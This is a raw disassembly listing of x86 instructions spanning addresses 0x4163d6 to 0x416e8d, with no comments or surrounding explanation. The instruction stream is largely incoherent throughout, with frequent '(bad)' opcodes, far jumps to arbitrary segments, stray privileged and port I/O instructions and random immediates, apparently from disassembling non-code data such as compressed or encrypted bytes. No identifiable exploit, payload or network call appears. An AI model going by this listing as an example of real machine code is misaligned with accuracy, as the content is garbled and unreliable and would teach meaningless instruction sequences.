  4163d6:	pushf  
  4163d7:	mov    dh,0xb7
  4163d9:	jne    0x4163ea
  4163db:	call   0x72e066b7
  4163e0:	test   DWORD PTR [edi+0xf756f68],edx
  4163e6:	pop    eax
  4163e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e8:	sbb    ebp,DWORD PTR [edx-0x70]
  4163eb:	cli    
  4163ec:	je     0x4163a1
  4163ee:	push   es
  4163ef:	retf   0x4af0
  4163f2:	int3   
  4163f3:	xchg   esp,eax
  4163f4:	sar    ecx,0x94
  4163f7:	adc    BYTE PTR [eax+0x523f5e29],dh
  4163fd:	mul    BYTE PTR [edi]
  4163ff:	add    eax,0x3b131192
  416404:	jmp    0xa5090327
  416409:	shl    DWORD PTR [edx],cl
  41640b:	xchg   ecx,eax
  41640c:	shr    DWORD PTR [ecx],1
  41640e:	mov    edi,esi
  416410:	mov    ds:0x0,eax
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	loop   0x416445
  416482:	std    
  416483:	adc    al,0x59
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x42000001,al
  41648d:	aas    
  41648e:	in     eax,dx
  41648f:	dec    edx
  416490:	mov    ebp,0xb6541572
  416495:	(bad)  [ebx]
  416497:	sbb    bl,BYTE PTR [esi]
  416499:	mov    DWORD PTR [esi+0xd201544],esp
  41649f:	repnz push eax
  4164a1:	jle    0x416513
  4164a3:	aam    0x76
  4164a5:	(bad)  
  4164a7:	or     dh,cl
  4164a9:	cwde   
  4164aa:	fsub   DWORD PTR [eax+0x3b30acb]
  4164b0:	mov    edx,0x885ef923
  4164b5:	mov    BYTE PTR [esi],ah
  4164b7:	je     0x41646b
  4164b9:	adc    ah,BYTE PTR [ebx*8-0x15318ab3]
  4164c0:	lods   al,BYTE PTR ds:[esi]
  4164c1:	add    eax,0xce69b809
  4164c6:	in     eax,0x45
  4164c8:	inc    edx
  4164c9:	and    esi,edi
  4164cb:	int    0x56
  4164cd:	sbb    DWORD PTR [ecx],ebp
  4164cf:	dec    esp
  4164d0:	mov    edx,0x65c4839f
  4164d5:	sub    esi,DWORD PTR [ecx+0x47]
  4164d8:	xchg   ah,dh
  4164da:	and    al,0x0
  4164dc:	scas   eax,DWORD PTR es:[edi]
  4164dd:	pop    ds
  4164de:	fcomp  QWORD PTR [edx]
  4164e0:	mov    esi,0x22708f27
  4164e5:	adc    BYTE PTR [eax+0x57],bl
  4164e8:	mov    ch,0x7c
  4164ea:	mov    al,ds:0x29f35b55
  4164ef:	pusha  
  4164f0:	cmp    cl,BYTE PTR [ebp+0x2a1b2cc3]
  4164f6:	shr    eax,cl
  4164f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f9:	add    al,0xcb
  4164fb:	xor    bh,al
  4164fd:	add    BYTE PTR [edx+edi*2+0x3b],ah
  416501:	pusha  
  416502:	or     dl,dl
  416504:	cmp    ch,bl
  416506:	js     0x41652c
  416508:	jbe    0x416544
  41650a:	lahf   
  41650b:	(bad)  
  41650c:	jle    0x41652d
  41650e:	inc    edx
  41650f:	push   0x5
  416511:	sti    
  416512:	cld    
  416513:	mov    WORD PTR [ebx+0x97cd3fb],fs
  416519:	(bad)  
  41651b:	inc    eax
  41651c:	test   eax,0xde7c7fb8
  416521:	jmp    0x871d:0xb37d6ead
  416528:	fild   QWORD PTR [edx]
  41652a:	adc    bl,BYTE PTR [eax+0xf]
  41652d:	ins    DWORD PTR es:[edi],dx
  41652e:	pop    es
  41652f:	xor    al,0xd8
  416531:	pop    DWORD PTR [bx+si]
  416534:	mov    esi,0xd26a482a
  416539:	inc    ecx
  41653a:	popa   
  41653b:	cli    
  41653c:	ror    DWORD PTR [ebp+0x4c86a457],cl
  416542:	popa   
  416543:	mov    dl,0xca
  416545:	nop
  416546:	mov    al,0xcf
  416548:	ror    BYTE PTR gs:[esi+0x139b5d26],1
  41654f:	sbb    eax,0x310cfb30
  416554:	and    eax,0xefc20e3c
  416559:	clc    
  41655a:	cmp    eax,0xb87b5f2e
  41655f:	outs   dx,BYTE PTR ds:[esi]
  416560:	retf   
  416561:	mov    WORD PTR [ebx+0x41],ss
  416564:	out    dx,al
  416565:	xchg   edi,eax
  416566:	pop    ss
  416567:	fstp   st(6)
  416569:	mov    ebp,0x908d0009
  41656e:	in     al,0x30
  416570:	or     al,0x8
  416572:	or     DWORD PTR [ebx-0xc],esp
  416575:	lahf   
  416576:	or     DWORD PTR [edx+0x5a141add],ecx
  41657c:	daa    
  41657d:	and    BYTE PTR [edx],0x55
  416580:	inc    eax
  416581:	sbb    DWORD PTR [edi+0xa],ebx
  416584:	adc    ecx,DWORD PTR [esi]
  416586:	retf   0x4dfd
  416589:	xchg   esp,eax
  41658a:	loop   0x416559
  41658c:	icebp  
  41658d:	or     al,0xa4
  41658f:	jmp    0x0:0xea
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x29b04354]
  416601:	int    0xb8
  416603:	jp     0x416663
  416605:	in     al,dx
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0xd9000001
  41660d:	frstor [ebx+0x5135b89b]
  416613:	mov    al,ds:0x69457701
  416618:	pop    ss
  416619:	aas    
  41661a:	imul   esp,esi,0xbb726dad
  416620:	out    0xf7,eax
  416622:	cmp    ebp,0xfffffff8
  416625:	ds dec ebp
  416627:	cmp    DWORD PTR [ebp+0x20],ebx
  41662a:	cs jo  0x416694
  41662d:	push   ebp
  41662e:	jl     0x416615
  416630:	adc    bl,BYTE PTR ds:0x269ed6cc
  416636:	fwait
  416637:	repz data16 mov bh,0x89
  41663b:	pop    esi
  41663c:	loope  0x41666c
  41663e:	iret   
  41663f:	inc    ebx
  416640:	in     al,dx
  416641:	ins    DWORD PTR es:[edi],dx
  416642:	shr    edx,1
  416644:	in     eax,dx
  416645:	pop    ebp
  416646:	popa   
  416647:	jo     0x416668
  416649:	adc    dl,cl
  41664b:	or     ax,0x5e36
  41664f:	(bad)  
  416650:	jl     0x416660
  416652:	cwde   
  416653:	fprem1 
  416655:	fsubp  st(7),st
  416657:	mov    esp,ebp
  416659:	les    ebp,FWORD PTR [eax-0x2cdfca91]
  41665f:	(bad)  
  416660:	mov    eax,0xe0657d57
  416665:	inc    edi
  416666:	and    eax,0xc65ace5f
  41666b:	pop    edi
  41666c:	pushf  
  41666d:	xor    BYTE PTR [edx],al
  41666f:	push   edx
  416670:	sbb    ebx,edi
  416672:	jecxz  0x41664f
  416674:	jmp    0xe365:0xc5de37ea
  41667b:	es xchg ebx,eax
  41667d:	mov    WORD PTR [eax+0x12],fs
  416680:	leave  
  416681:	cli    
  416682:	loopne 0x416624
  416684:	jne    0x4166d0
  416686:	cmc    
  416687:	test   eax,0xc95651c8
  41668d:	cmp    dl,BYTE PTR [eax-0x26eec0c2]
  416693:	and    edx,esi
  416695:	or     ah,BYTE PTR [esi+0x3ff4ab04]
  41669b:	sub    edx,DWORD PTR [edx]
  41669d:	xchg   edx,eax
  41669e:	push   esi
  41669f:	daa    
  4166a0:	cmp    BYTE PTR [edx+0x2d],al
  4166a3:	and    DWORD PTR [esi-0x4e0b8cfa],0xfde6a01c
  4166ad:	add    BYTE PTR [edi],0x6d
  4166b0:	fs and eax,ecx
  4166b3:	jp     0x41672b
  4166b5:	call   ecx
  4166b7:	sub    cl,BYTE PTR [ebx]
  4166b9:	in     eax,0xf1
  4166bb:	retf   0xd80
  4166be:	and    ecx,DWORD PTR [edi-0x30f139db]
  4166c4:	mov    al,0xc
  4166c6:	mov    esi,0xdc8f66c7
  4166cb:	scas   eax,DWORD PTR es:[edi]
  4166cc:	and    al,0x3f
  4166ce:	xchg   ebx,eax
  4166cf:	cdq    
  4166d0:	sub    DWORD PTR [edx],0xce735445
  4166d6:	jg     0x4166a2
  4166d8:	(bad)  
  4166d9:	lahf   
  4166da:	and    edx,edi
  4166dc:	push   ecx
  4166dd:	sbb    al,0x0
  4166df:	lea    edi,[eax+0x31c2ff5d]
  4166e5:	sbb    BYTE PTR ds:[eax],al
  4166e8:	ja     0x416673
  4166ea:	pusha  
  4166eb:	cmp    cl,BYTE PTR [edi+0x202cea02]
  4166f1:	mov    esp,0xe0a41520
  4166f6:	xchg   ecx,eax
  4166f7:	pop    es
  4166f8:	push   cs
  4166f9:	call   0xc6cef9ce
  4166fe:	hlt    
  4166ff:	xlat   BYTE PTR ds:[ebx]
  416700:	jmp    0x416746
  416702:	shl    BYTE PTR [ebx],1
  416704:	lds    edi,FWORD PTR [ecx+ebp*1-0x40]
  416708:	adc    dl,bh
  41670a:	gs jp  0x4166bb
  41670d:	sub    eax,0xa1b50e
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	(bad)  
  416781:	mov    esi,0xed63f9f1
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x49000001
  41678d:	int    0x36
  41678f:	mov    edx,0x579bcc45
  416794:	fsub   st(6),st
  416796:	cmp    bh,al
  416798:	xor    dl,bh
  41679a:	fld    QWORD PTR [esi]
  41679c:	(bad)  [edx+eax*8-0x5c546f01]
  4167a3:	mov    al,ds:0x657cad90
  4167a8:	fild   WORD PTR [ecx+ebx*2-0x16e7d8d5]
  4167af:	test   eax,0xd9e74695
  4167b4:	pop    ds
  4167b5:	dec    ebp
  4167b6:	xor    edi,DWORD PTR [esi]
  4167b8:	push   ds
  4167b9:	dec    ebp
  4167ba:	xor    al,ah
  4167bc:	pop    ecx
  4167bd:	rdmsr  
  4167bf:	dec    dh
  4167c1:	pushf  
  4167c2:	fbstp  TBYTE PTR [edx]
  4167c4:	arpl   WORD PTR [ecx+0x769e16a4],si
  4167ca:	ss daa 
  4167cc:	sub    bl,BYTE PTR [ebp-0x39]
  4167cf:	pop    ss
  4167d0:	xchg   DWORD PTR [eax-0x44493975],edx
  4167d6:	jne    0x41679f
  4167d8:	xor    al,0xed
  4167da:	or     ebp,ebx
  4167dc:	fs daa 
  4167de:	shl    BYTE PTR [eax-0x421e7f33],1
  4167e4:	nop
  4167e5:	xor    dh,BYTE PTR [ebx]
  4167e7:	in     al,0x2a
  4167e9:	fsub   st,st(2)
  4167eb:	pop    esi
  4167ec:	xchg   esp,eax
  4167ed:	cs push ebx
  4167ef:	cwde   
  4167f0:	adc    dh,ah
  4167f2:	mov    edx,0x42cc4d8f
  4167f7:	dec    esi
  4167f8:	or     eax,0x201426e7
  4167fd:	sbb    BYTE PTR [esi+ebp*2],cl
  416800:	mov    ebp,0xdfdf90bf
  416805:	imul   esp
  416807:	xchg   esp,eax
  416808:	loop   0x416800
  41680a:	dec    eax
  41680b:	aad    0xf
  41680d:	add    al,0x41
  41680f:	or     BYTE PTR ds:0xde91f974,dl
  416815:	call   0x83a5:0xcc322c96
  41681c:	push   0xffffffdc
  41681e:	sub    edx,edi
  416820:	mov    eax,0x60ec62d7
  416825:	ror    BYTE PTR [ecx+0x1e],0x6f
  416829:	xchg   esp,eax
  41682a:	outs   dx,BYTE PTR ds:[esi]
  41682b:	inc    edx
  41682c:	iret   
  41682d:	or     al,0xaa
  41682f:	or     ecx,ecx
  416831:	mov    ebx,eax
  416833:	shr    DWORD PTR [edx+0x35],1
  416836:	adc    al,0x18
  416838:	add    ebp,DWORD PTR [ecx-0xf0654a3]
  41683e:	stos   DWORD PTR es:[edi],eax
  41683f:	inc    ecx
  416840:	ss inc ecx
  416842:	jle    0x41689d
  416844:	cmp    edi,DWORD PTR [esi+0x4c4d9f40]
  41684a:	(bad)  
  41684b:	cmc    
  41684c:	addr16 mov ds:0x47e1,eax
  416850:	test   DWORD PTR ds:0x2efa8c6c,0x3bf73cae
  41685a:	xchg   esp,eax
  41685b:	mov    al,0xcc
  41685d:	sub    DWORD PTR [ecx],esi
  41685f:	xlat   BYTE PTR ds:[ebx]
  416860:	and    eax,0x2cc78808
  416865:	cwde   
  416866:	ins    DWORD PTR es:[edi],dx
  416867:	test   al,0x42
  416869:	pop    ds
  41686a:	pop    ss
  41686b:	out    0xb5,eax
  41686d:	(bad)  
  41686e:	stos   BYTE PTR es:[edi],al
  41686f:	mov    eax,ds:0x589309f8
  416874:	enter  0x427,0xa0
  416878:	aaa    
  416879:	jmp    0x1f3e:0xb30cc324
  416880:	or     ah,BYTE PTR [edx-0x6f129d8d]
  416886:	(bad)  
  416887:	icebp  
  416888:	imul   DWORD PTR [edx]
  41688a:	mov    dh,0x1a
  41688c:	outs   dx,BYTE PTR ds:[esi]
  41688d:	sbb    al,0x7b
  41688f:	pushf  
  416890:	ret    
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xef187445
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [edx],ah
  41690d:	jle    0x4168d3
  41690f:	pop    esi
  416910:	cdq    
  416911:	icebp  
  416912:	jge    0x416906
  416914:	push   0xffffff87
  416916:	xor    eax,0xb0661669
  41691b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41691c:	sbb    eax,0xecc06616
  416921:	pop    ebx
  416922:	fnstcw WORD PTR [ecx+0x6086266c]
  416928:	sub    eax,0x7c0c5b7e
  41692d:	push   es
  41692e:	arpl   cx,cx
  416930:	sbb    BYTE PTR [esi*1+0x3fef374b],ah
  416937:	mov    al,BYTE PTR [edi]
  416939:	dec    ebx
  41693a:	in     al,dx
  41693b:	mul    BYTE PTR ds:0x2a068b52
  416941:	jmp    0x4168d4
  416943:	xchg   ebx,ecx
  416945:	jae    0x41693e
  416947:	xlat   BYTE PTR ds:[ebx]
  416948:	xor    al,0x22
  41694a:	es push 0x2e
  41694d:	call   DWORD PTR [edx]
  41694f:	push   cs
  416950:	out    dx,al
  416951:	inc    ebp
  416952:	scas   eax,DWORD PTR es:[edi]
  416953:	sub    al,0x5f
  416955:	je     0x41692c
  416957:	adc    edi,DWORD PTR [ecx]
  416959:	mov    cl,0xb9
  41695b:	xchg   ebx,eax
  41695c:	add    esp,edi
  41695e:	jmp    0x5fa84a71
  416963:	adc    eax,0xf6cec41c
  416968:	sbb    al,0x6a
  41696a:	and    cl,BYTE PTR [esi+0xcd1c160]
  416970:	hlt    
  416971:	cwde   
  416972:	xchg   BYTE PTR [edx],ch
  416974:	daa    
  416975:	push   ss
  416976:	jne    0x416900
  416978:	(bad)  [ebx+0x59]
  41697b:	rcr    dh,1
  41697d:	pop    esp
  41697e:	cmp    al,0xc1
  416980:	call   0x257285ae
  416985:	add    esp,DWORD PTR [ebx-0x38]
  416988:	(bad)  
  416989:	sar    DWORD PTR [ecx+0x1fd6479c],cl
  41698f:	sub    edx,DWORD PTR [edi]
  416991:	lea    eax,ds:0xbe9a3910
  416997:	cs cmp al,0x3c
  41699a:	rcl    BYTE PTR [eax+0xa7cd317],1
  4169a0:	ds out 0x3e,al
  4169a3:	jp     0x4169ae
  4169a5:	xchg   edx,eax
  4169a6:	mov    al,ah
  4169a8:	or     DWORD PTR [esi-0x3e3258db],esp
  4169ae:	das    
  4169af:	add    al,0xca
  4169b1:	add    bl,al
  4169b3:	repz rol bh,cl
  4169b6:	cmp    cl,BYTE PTR [ebp+0x1e1d0201]
  4169bc:	jle    0x416955
  4169be:	sub    DWORD PTR [edx],ebp
  4169c0:	dec    ebp
  4169c1:	push   es
  4169c2:	aas    
  4169c3:	outs   dx,DWORD PTR ds:[esi]
  4169c4:	outs   dx,DWORD PTR ds:[esi]
  4169c5:	push   edi
  4169c6:	xchg   edx,eax
  4169c7:	into   
  4169c8:	(bad)  
  4169c9:	call   0xd06d206b
  4169ce:	dec    eax
  4169cf:	adc    BYTE PTR [esi+0x17e2e5f5],0x32
  4169d6:	sub    BYTE PTR [ebp-0x23b8045c],dl
  4169dc:	push   sp
  4169de:	cmp    ch,BYTE PTR [ecx+0x60]
  4169e1:	adc    eax,0x9703048b
  4169e6:	mov    ecx,0xa1b31783
  4169eb:	push   ds
  4169ec:	mov    edi,0x2ebe50d2
  4169f1:	push   ds
  4169f2:	mov    ds:0x4ffbbbe7,eax
  4169f7:	xchg   DWORD PTR [ebp+eiz*2-0x7650661a],esp
  4169fe:	mov    bh,0xd7
  416a00:	mov    bh,0xbe
  416a02:	nop
  416a03:	test   BYTE PTR [eax],bl
  416a05:	and    al,0x46
  416a07:	rol    DWORD PTR [esp+edi*8+0x6df1a2f4],cl
  416a0e:	mov    BYTE PTR [ebx],ch
  416a10:	in     al,dx
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x98a70ba3
  416a82:	hlt    
  416a83:	sbb    ebp,DWORD PTR [ebp-0x11]
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0xa4000001
  416a8d:	sbb    al,0x2
  416a8f:	jnp    0x416abe
  416a91:	lods   al,BYTE PTR ds:[esi]
  416a92:	js     0x416afd
  416a94:	xor    BYTE PTR [esi],ah
  416a96:	or     bh,ah
  416a98:	sub    BYTE PTR [edi-0x2],ch
  416a9b:	(bad)  
  416a9c:	xchg   ebp,eax
  416a9d:	sub    eax,0x67545b66
  416aa2:	pop    esp
  416aa3:	scas   eax,DWORD PTR es:[edi]
  416aa4:	jnp    0x416a2f
  416aa6:	adc    al,0xb4
  416aa8:	sbb    eax,0x7f0de254
  416aad:	sub    al,0xde
  416aaf:	jae    0x416b00
  416ab1:	add    al,0x85
  416ab3:	rol    DWORD PTR [edx+0x6bd0481f],cl
  416ab9:	mov    ah,0xd6
  416abb:	cmp    eax,0xc42a3b18
  416ac0:	pop    ecx
  416ac1:	out    dx,eax
  416ac2:	push   esi
  416ac3:	out    0xbc,eax
  416ac5:	cmp    eax,0x1bcaaa7d
  416aca:	xor    edi,DWORD PTR [esi+eiz*2]
  416acd:	sub    DWORD PTR [edx],0xccbd2420
  416ad3:	jae    0x416ae6
  416ad5:	test   eax,0x8bbe43a9
  416ada:	push   0xae05ec76
  416adf:	adc    al,0x6d
  416ae1:	xchg   ecx,eax
  416ae2:	repnz inc ebp
  416ae4:	bound  ebp,QWORD PTR [ebp+0x1f5616a5]
  416aea:	in     al,dx
  416aeb:	inc    eax
  416aec:	sbb    edx,DWORD PTR [ecx-0x4e0b2026]
  416af2:	push   ss
  416af3:	ins    BYTE PTR es:[edi],dx
  416af4:	jl     0x416aad
  416af6:	and    al,0x72
  416af8:	mov    WORD PTR [ebx+eiz*4],?
  416afb:	mov    ch,BYTE PTR [ebx]
  416afd:	cli    
  416afe:	or     eax,0x6526864b
  416b03:	mov    cl,0x6f
  416b05:	cmc    
  416b06:	rcl    edi,0x3b
  416b09:	jg     0x416aa0
  416b0b:	cmp    bl,bl
  416b0d:	sbb    eax,0xcef7b01a
  416b12:	pop    ds
  416b13:	sbb    BYTE PTR ds:0x48df32aa,bl
  416b19:	add    al,dh
  416b1b:	sti    
  416b1c:	test   DWORD PTR [ecx-0x14820d5],ebp
  416b22:	fwait
  416b23:	fwait
  416b24:	test   BYTE PTR ds:0xe1ce8cf6,cl
  416b2a:	retf   
  416b2b:	cmp    esi,DWORD PTR ds:0x90f9c6f1
  416b31:	neg    DWORD PTR [eax-0xd995958]
  416b37:	xlat   BYTE PTR ds:[ebx]
  416b38:	sub    eax,0x7a4a26df
  416b3d:	dec    ebx
  416b3e:	mov    esi,0xed88cbb9
  416b43:	stos   BYTE PTR es:[edi],al
  416b44:	jo     0x416ae6
  416b46:	xchg   ebp,eax
  416b47:	xor    bl,BYTE PTR [edx-0x30c8f88c]
  416b4d:	leave  
  416b4e:	lods   eax,DWORD PTR ds:[esi]
  416b4f:	dec    esi
  416b50:	and    DWORD PTR [eax-0x3e4eab1c],ebx
  416b56:	mov    BYTE PTR [ebp+ebp*1-0x33],bh
  416b5a:	sbb    eax,0xc3604d57
  416b5f:	xchg   DWORD PTR [esi],ebx
  416b61:	mov    ds,WORD PTR [esi-0x74171f4c]
  416b67:	js     0x416af0
  416b69:	icebp  
  416b6a:	icebp  
  416b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b6c:	sub    BYTE PTR [ecx-0x616bd5e0],dl
  416b72:	fpatan 
  416b74:	pusha  
  416b75:	fmul   DWORD PTR [esi+0x40a86675]
  416b7b:	pop    edi
  416b7c:	mov    edi,DWORD PTR [edi+0x10e647ee]
  416b82:	scas   al,BYTE PTR es:[edi]
  416b83:	fsubr  QWORD PTR [edx-0x70]
  416b86:	mov    bh,0x80
  416b88:	mov    bl,0xb1
  416b8a:	push   cs
  416b8b:	hlt    
  416b8c:	stc    
  416b8d:	or     ecx,DWORD PTR [eax]
  416b8f:	sar    al,0x0
	...
  416bf2:	add    BYTE PTR [eax],al
  416bf4:	jecxz  0x416c5b
  416bf6:	push   cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xe45b70a9
  416c01:	cs mov ah,0xed
  416c04:	jb     0x416bf6
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0x92000001
  416c0d:	xchg   edx,eax
  416c0e:	or     al,0xbc
  416c10:	mov    bl,0xcb
  416c12:	sbb    ebx,esi
  416c14:	ins    BYTE PTR es:[edi],dx
  416c15:	xchg   BYTE PTR [ebx-0x13],dh
  416c18:	cmp    DWORD PTR [esi-0x5f],0x94fd3cfe
  416c1f:	dec    esp
  416c20:	or     al,0x5
  416c22:	shl    esi,1
  416c24:	pop    ebp
  416c25:	call   0x3effe515
  416c2a:	jmp    0xca48773f
  416c2f:	push   edi
  416c30:	fsubr  QWORD PTR [ecx+edi*2+0x1d5c097]
  416c37:	nop
  416c38:	mov    bl,0xa9
  416c3a:	fcmovnu st,st(5)
  416c3c:	inc    edi
  416c3d:	adc    al,0x69
  416c3f:	rcl    eax,0x51
  416c42:	inc    esp
  416c43:	test   eax,0xbd3ad5e7
  416c48:	pop    ecx
  416c49:	lds    esi,FWORD PTR ds:0x78b17711
  416c4f:	mov    al,ds:0xb305270d
  416c54:	adc    BYTE PTR [ebx+0x55],dh
  416c57:	inc    ecx
  416c58:	pop    ss
  416c59:	stos   BYTE PTR es:[edi],al
  416c5a:	popa   
  416c5b:	ficomp WORD PTR [edx]
  416c5d:	repz dec edi
  416c5f:	retf   
  416c60:	mov    cl,0x31
  416c62:	or     bh,BYTE PTR [edi+0x36]
  416c65:	mov    edx,0x5fc71475
  416c6a:	xor    edi,esi
  416c6c:	cdq    
  416c6d:	jmp    0x5b1c5e2d
  416c72:	lods   al,BYTE PTR gs:[esi]
  416c74:	push   esp
  416c75:	test   BYTE PTR [eax],bl
  416c77:	or     bl,BYTE PTR [edx]
  416c79:	outs   dx,DWORD PTR ds:[esi]
  416c7a:	and    dl,bl
  416c7c:	lock jne 0x416ce2
  416c7f:	arpl   WORD PTR [eax],ax
  416c81:	mov    dh,0xfb
  416c83:	fild   QWORD PTR [ebx-0xc]
  416c86:	jo     0x416cbc
  416c88:	xor    eax,0xb2845ec2
  416c8d:	call   0xeb60:0xbfdeae77
  416c94:	scas   eax,DWORD PTR es:[edi]
  416c95:	jl     0x416d04
  416c97:	fdiv   DWORD PTR [edi]
  416c99:	ss pop ecx
  416c9b:	int3   
  416c9c:	repnz retf 0x6acf
  416ca0:	scas   al,BYTE PTR es:[edi]
  416ca1:	(bad)  
  416ca3:	test   al,0x84
  416ca5:	repz aam 0xb8
  416ca8:	mov    WORD PTR [ecx-0x33],fs
  416cab:	mov    ch,0xd2
  416cad:	mov    dh,0xd0
  416caf:	rcl    al,0x23
  416cb2:	jnp    0x416cfd
  416cb4:	jmp    0x416c8a
  416cb6:	jns    0x416d14
  416cb8:	aad    0x37
  416cba:	sub    BYTE PTR [ebp-0x43],cl
  416cbd:	push   ebx
  416cbe:	data16 add BYTE PTR [ebx-0x3],bl
  416cc2:	ret    
  416cc3:	les    esp,FWORD PTR [eax-0x12b42c14]
  416cc9:	ret    0x44a1
  416ccc:	je     0x416c53
  416cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ccf:	jno    0x416ca2
  416cd1:	and    al,0xdc
  416cd3:	ror    DWORD PTR [ecx+0x73],0x27
  416cd7:	add    BYTE PTR [ecx-0x3a64ff52],ch
  416cdd:	mov    al,0x9c
  416cdf:	push   edi
  416ce0:	mov    ebp,0xb01062b3
  416ce5:	rcl    DWORD PTR [ecx-0x7e],cl
  416ce8:	inc    ebx
  416ce9:	imul   esp,esi,0xc8a6340c
  416cef:	add    dl,BYTE PTR [ebx+eiz*2]
  416cf2:	fucomp st(3)
  416cf4:	xor    dh,BYTE PTR [ebp-0x4d43ed29]
  416cfa:	not    DWORD PTR [esi+ebp*8+0x65d90ce4]
  416d01:	inc    ecx
  416d02:	push   edi
  416d03:	add    DWORD PTR [ecx+0x538cb7a2],eax
  416d09:	inc    ax
  416d0b:	cmp    BYTE PTR [eax],bl
  416d0d:	sbb    DWORD PTR [esi+0x7362],esp
	...
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	push   esi
  416d81:	pop    edx
  416d82:	fbld   TBYTE PTR [edi+esi*2+0x50000f1]
  416d89:	add    DWORD PTR [eax],eax
  416d8b:	add    BYTE PTR [ebx-0x6e4253db],cl
  416d91:	sbb    DWORD PTR [edi],edx
  416d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d94:	outs   dx,BYTE PTR ds:[esi]
  416d95:	repnz fwait
  416d97:	jecxz  0x416d50
  416d99:	adc    DWORD PTR [edi-0x2a],ebp
  416d9c:	push   0xf8824893
  416da1:	sbb    BYTE PTR [ebx],dl
  416da3:	and    al,BYTE PTR [ecx+ecx*8+0x2abb9076]
  416daa:	sub    al,0x50
  416dac:	sbb    DWORD PTR [ebp-0x15],ecx
  416daf:	inc    ecx
  416db0:	xchg   DWORD PTR [edx+edx*4],eax
  416db3:	mov    ecx,DWORD PTR [edi]
  416db5:	jle    0x416e26
  416db7:	xor    eax,0xc978c027
  416dbc:	popa   
  416dbd:	mov    ecx,0xf91147d6
  416dc2:	mov    edi,DWORD PTR [ecx]
  416dc4:	stos   DWORD PTR es:[edi],eax
  416dc5:	sbb    BYTE PTR [esi],ch
  416dc7:	cmp    BYTE PTR [esi+esi*4],0xc2
  416dcb:	lods   eax,DWORD PTR fs:[esi]
  416dcd:	in     al,0x50
  416dcf:	xor    edx,eax
  416dd1:	enterw 0xf177,0x5e
  416dd6:	data16 adc al,0xbc
  416dd9:	dec    edx
  416dda:	rol    BYTE PTR [eax+0x51],cl
  416ddd:	xchg   ecx,eax
  416dde:	imul   edx,edi,0x30
  416de1:	adc    edi,ecx
  416de3:	dec    edi
  416de4:	out    dx,al
  416de5:	adc    DWORD PTR [ecx],ebp
  416de7:	cmp    DWORD PTR [eax],esp
  416de9:	(bad)
  416dee:	adc    ebp,DWORD PTR [edx]
  416df0:	dec    edi
  416df1:	jge    0x416e26
  416df3:	mov    WORD PTR [esi+0x1ded056a],es
  416df9:	add    DWORD PTR [ebx-0x1dba2b30],ebp
  416dff:	xor    DWORD PTR [ebx-0x323c0098],eax
  416e05:	retf   0xd1c6
  416e08:	shl    edi,1
  416e0a:	cld    
  416e0b:	fisubr WORD PTR [ebx-0x6]
  416e0e:	push   ss
  416e0f:	dec    esi
  416e10:	imul   edi,esp,0x19
  416e13:	and    DWORD PTR [edx+0x3b4e83e8],0xe3cb33ee
  416e1d:	mov    ss,WORD PTR [ebx-0x17e9e2e2]
  416e23:	fadd   st,st(2)
  416e25:	jmp    0xa056:0xf77a1316
  416e2c:	out    0xab,eax
  416e2e:	sbb    DWORD PTR [edx-0x77797725],eax
  416e34:	adc    al,0xf6
  416e36:	icebp  
  416e37:	(bad)  
  416e38:	pop    ss
  416e39:	repnz in eax,0x66
  416e3c:	xchg   esp,eax
  416e3d:	imul   eax,DWORD PTR [eax],0xf73a16ad
  416e43:	arpl   WORD PTR [ecx+0x6e039dfd],dx
  416e49:	fadd   QWORD PTR [ecx]
  416e4b:	adc    DWORD PTR [esi-0x3fe4cf4],0xa
  416e52:	adc    dl,BYTE PTR ds:0x24ccfc4f
  416e58:	xchg   edi,eax
  416e59:	mov    edi,0x5b068d69
  416e5e:	inc    esp
  416e5f:	test   BYTE PTR ds:0xcdd947c2,ch
  416e65:	gs xchg esi,eax
  416e67:	stc    
  416e68:	shl    DWORD PTR [ebx+0x58d195e7],0xdd
  416e6f:	ja     0x416ecd
  416e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e72:	cmp    BYTE PTR [esi+0x15edcd38],ch
  416e78:	fcomp  DWORD PTR [ebx+0x6d]
  416e7b:	lock fucom st(0)
  416e7e:	sar    DWORD PTR [eax-0x6e05d646],0x57
  416e85:	xchg   BYTE PTR [edx-0xe],bl
  416e88:	mov    ds:0x5635901c,eax
  416e8d:	dec    ebx
